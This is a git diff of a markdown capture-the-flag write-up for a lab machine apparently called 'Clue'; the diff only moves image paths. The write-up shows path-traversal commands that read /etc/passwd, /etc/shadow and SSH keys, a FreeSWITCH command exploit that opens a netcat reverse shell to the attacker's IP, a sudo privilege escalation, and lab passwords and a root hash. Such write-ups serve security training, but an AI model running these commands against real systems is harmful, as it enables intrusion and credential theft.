@@ -64,31 +64,31 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 53.47 seconds
 ```
 Port 80 turned out that it's not accessible.
-![](Clue1.png)
+![](Images/Clue1.png)
 And there's a directory found by directories enumeration `/backup` is also not accessible to us.
-![](Clue2.png)
-![](Clue3.png)
+![](Images/Clue2.png)
+![](Images/Clue3.png)
 ## Web Enumeration (port 3000)
 
 A distributed database management called "Cassandra" runs on port 3000.
-![](Clue4.png)
+![](Images/Clue4.png)
 And there is an exploit that seems to be promising, and I am going to give it a shot and see if it works or not.
 
 After inspecting the payload code, I know that the attacker can perform directory traversal by adding dots and slashes in the URL.
-![](Clue5.png)
-![](Clue6.png)
+![](Images/Clue5.png)
+![](Images/Clue6.png)
 It works! And I can see there are two users on the machine: "cassie" and "anthony".
 ```python
 python3 49362.py -p 3000 192.168.164.240 /etc/passwd
 ```
 
-![](Clue7.png)
+![](Images/Clue7.png)
 According to the comment on the exploit, credentials can be revealed by viewing `/proc/self/cmdline`, and it does.
-![](Clue8.png)
+![](Images/Clue8.png)
 ```python
 python3 49362.py -p 3000 192.168.164.240 /proc/self/cmdline
 ```
-![](Clue9.png)
+![](Images/Clue9.png)
 `cassie : SecondBiteTheApple330`
 But turn out the password can not be used to login into SSH.
 
@@ -97,42 +97,42 @@ After viewing the SSH config file (the same way as viewing `passwd` files), I 
  ```python
  python3 49362.py -p 3000 192.168.164.240 /etc/ssh/sshd_config
  ```
- ![](Clue10.png)
+ ![](Images/Clue10.png)
 
 ## FreeSWITCH Enumeration (port 8021)
 
 I can also find an exploit for FreeSWITCH. Even though I have yet to learn the version, it's not harmful to give it a try.
-![](Clue11.png)
-![](Clue12.png)
-![](Clue13.png)
-![](Clue14.png)
+![](Images/Clue11.png)
+![](Images/Clue12.png)
+![](Images/Clue13.png)
+![](Images/Clue14.png)
 Let’s try with the default password first. Okay, it seems like the password is wrong. Using Cassie’s password still won’t work as well.
 After some research, I found a link here to demonstrate how to change the socket password. It clearly says the password is stored in `/etc/freeswitch/autoload_configs/event_socket.conf.xml`
-![](Clue15.png)
+![](Images/Clue15.png)
 ```python
 python3 49362.py -p 3000 192.168.164.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml
 ```
 
-![](Clue16.png)
+![](Images/Clue16.png)
  I exposed another password: `StrongClueConEight021`
  And I changed the default password in freeswitch exploit to the one I found.
- ![](Clue17.png)
+ ![](Images/Clue17.png)
  It works. After specifying the legit password, I can run commands on the machine.
- ![](Clue18.png)
+ ![](Images/Clue18.png)
  After running `netcat` reverse shell, I am in the machine now.
  ```python
  python3 freeswitch-exploit.py 192.168.164.240 'nc -nv 192.168.45.226 3000 -e /bin/bash'
  ```
  
-![](Clue19.png)
-![](Clue20.png)
+![](Images/Clue19.png)
+![](Images/Clue20.png)
 
 ## Post Enumeration and Exploitation
 
 After obtaining an interactive shell, I can switch to cassie with the password: `SecondBiteTheApple330`.
-![](Clue21.png)
+![](Images/Clue21.png)
 And then I find that cassie can run `cassandra-web` as root without a password.
-![](Clue22.png)
+![](Images/Clue22.png)
 We can run cassandra-web without password. Well I mean, we already know that cassandra-web is vulnerable to LFI, but we can’t read some stuff because lack of privilege. If we can run cassandra-web as root, can we read stuff as root as well?
 
 Let’s try.
@@ -140,13 +140,13 @@ Let’s try.
 sudo -u root /usr/local/bin/cassandra-web -B 0.0.0.0:1337 -u cassie -p SecondBiteTheApple330
 ```
 
-![](Clue23.png)
+![](Images/Clue23.png)
 Okay, let’s see if we can indeed access it. The server is running on 0.0.0.0:9999 but I can’t access it from my Kali machine.
-![](Clue24.png)
+![](Images/Clue24.png)
 It is indeed hosted, and it turns out we can only access it from within the machine.
-![](Clue25.png)
+![](Images/Clue25.png)
 I tried opening a python server then transfer the exploit to the target machine, but it wasn’t working for some reason. But after reading the exploit, it’s pretty easy to replicate.
-![](Clue26.png)
+![](Images/Clue26.png)
 So it’s just the url + a huge amount of ‘../’, so we can replicate it by doing a GET request using curl. We can achieve it by something like :
 ```sh 
 curl --path-as-is http://0.0.0.0:1337/../../../../../../../../etc/shadow
@@ -171,7 +171,7 @@ That would defeat the exploit.
 
 Without this flag, the traversal attack might fail.
 
-![](Clue27.png)
+![](Images/Clue27.png)
 Indeed. Now we can read stuff as root.
 ```sh
 root:$6$kuXiAC8PIOY2uis9$LrTzlkYSlY485ZREBLW5iPSpNxamM38BL85BPmaIAWp05VlV.tdq0EryiFLbLryvbsGTx50dLnMsxIk7PJB5P1:19209:0:99999:7:::  
@@ -183,17 +183,17 @@ Let’s try to see if root have id_rsa.
  curl --path-as-is http://0.0.0.0:1337/../../../../../../../../root/.ssh/id_rsa
 ```
 
-![](Clue28.png)
+![](Images/Clue28.png)
 Nothing.
 We'll look for anthony.
 ```sh
 curl --path-as-is http://0.0.0.0:1337/../../../../../../../../../home/anthony/.ssh/id_rsa
 ```
 
-![](Clue29.png)
+![](Images/Clue29.png)
 Anthony have id_rsa.
 We can’t even SSH using it to anthony. BUT WE CAN DO IT AS ROOT. WTF is this machine.
 We simply copy it and made a new file named `id_rsa`.
-![](Clue30.png)
+![](Images/Clue30.png)
 We got the flags.
-![](Clue31.png)
+![](Images/Clue31.png)
